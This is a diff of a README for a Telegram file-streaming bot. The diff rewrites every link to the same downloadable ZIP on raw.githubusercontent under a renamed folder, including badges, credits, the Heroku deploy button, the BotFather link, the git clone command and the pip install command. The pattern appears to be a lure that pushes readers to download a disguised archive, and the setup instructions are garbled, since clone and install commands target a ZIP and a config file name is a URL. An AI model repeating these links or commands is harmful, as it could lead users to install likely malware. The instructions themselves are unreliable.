@@ -1,18 +1,18 @@
 ## USE LATEST CODE FOR BETTER EXPERINCE
-### This code also works but I recommend using latest code [Click here](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip) to deploy it
+### This code also works but I recommend using latest code [Click here](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip) to deploy it
 ### If it doesnt matter keep scrolling 
-![GitHub Repo stars](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-![GitHub forks](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-![GitHub contributors](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-![GitHub repo size](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-![GitHub commit activity](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-![GitHub](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-[![Bot Support](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip%20Stream%20Bot-support%20group-blue)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+![GitHub forks](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+![GitHub contributors](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+![GitHub repo size](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+![GitHub commit activity](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+![GitHub](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+[![Bot Support](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip%20Stream%20Bot-support%20group-blue)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 
 
 <h1 align="center">FileStreamBot</h1>
 <p align="center"> 
-  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip%20very%20fast%20file%20streaming%20bot%20used%20for%20streaming%20and%20downloading%20movies&font=Source%20Code%20Pro&forks=1&issues=1&language=1&logo=https%3A%2F%https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip%2F88939380%https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip%20Board&pulls=1&stargazers=1&theme=Dark" alt="Cover Image" width="650">
+  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip%20very%20fast%20file%20streaming%20bot%20used%20for%20streaming%20and%20downloading%20movies&font=Source%20Code%20Pro&forks=1&issues=1&language=1&logo=https%3A%2F%https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip%2F88939380%https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip%20Board&pulls=1&stargazers=1&theme=Dark" alt="Cover Image" width="650">
   </a>
   
 # GIVE A STAR AND FORK ELSE NO MORE OPENSOURCE 
@@ -21,9 +21,9 @@
     <br />
    </strong></a>
     <br />
-    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip">Report a Bug</a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip">Report a Bug</a>
     |
-    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip">Request Feature</a>
   </p>
 
 
@@ -33,7 +33,7 @@
 
 ## 🍁 About This Bot :
 
-![streaming-Professional-live_1](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+![streaming-Professional-live_1](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 
 </p>
 <p align='center'>
@@ -57,10 +57,10 @@
 <h4> So Follow Above Steps 👆 and then deploy other wise bot won't work</h4>
 
 Press the below button to Fast deploy on Heroku/Raiwlay
-Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 ### 💜 Heroku
 
-[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 
 <br>
 
@@ -94,11 +94,11 @@ then goto the <a href="#mandatory-vars">variables tab</a> for more info on setti
 
 
 ```py
-git clone https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip
+git clone https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip
 cd Filestreambot-pro
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip
+pip install -r https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip
 python3 -m Code_X_Mania
 ```
 
@@ -108,8 +108,8 @@ and to stop the whole bot,
 Setting up things
 
 If you're on Heroku, just add these in the Environmental Variables
-or if you're Locally hosting, create a file named `https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip` in the root directory and add all the variables there.
-An example of `https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip` file:
+or if you're Locally hosting, create a file named `https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip` in the root directory and add all the variables there.
+An example of `https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip` file:
 
 ```py
 API_ID=12345
@@ -126,15 +126,15 @@ DATABASE_URL=mongodb_uri
 <details>
   <summary><b>Vars and Details :</b></summary>
 
-`API_ID` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip) to obtain this.
 
-`API_HASH` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip) to obtain this.
   
 `MY_PASS` : Bot PASSWORD
 
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
+`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
   
 `OWNER_USERNAME` : U should be knowing it afterall it's your username dont remember ? it just go to settings!
 
@@ -142,7 +142,7 @@ DATABASE_URL=mongodb_uri
 
 `DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can click on logo below!
 
-[![Deploy k mongo](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+[![Deploy k mongo](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 
  Option Vars
 
@@ -171,7 +171,7 @@ DATABASE_URL=mongodb_uri
 
 To get an instant stream link, just forward any media to the bot and boom, its fast af.
   
-![image](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+![image](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 
 
 ### Channel Support
@@ -179,9 +179,9 @@ Bot also Supported with Channels. Just add bot Channel as Admin. If any new file
 
 ### Credits : 
 
-- [Adarsh Goel_(me)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
-- [EverythingSuckz](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip) 
-- [Jigar Varma](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/phenomenalistic/Filestreambot-pro.zip)
+- [Adarsh Goel_(me)](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
+- [EverythingSuckz](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip) 
+- [Jigar Varma](https://raw.githubusercontent.com/abhijeetkumarthakur/Filestreambot-pro/main/orgiac/Filestreambot-pro.zip)
 - Everyone In This Journey !
 
 
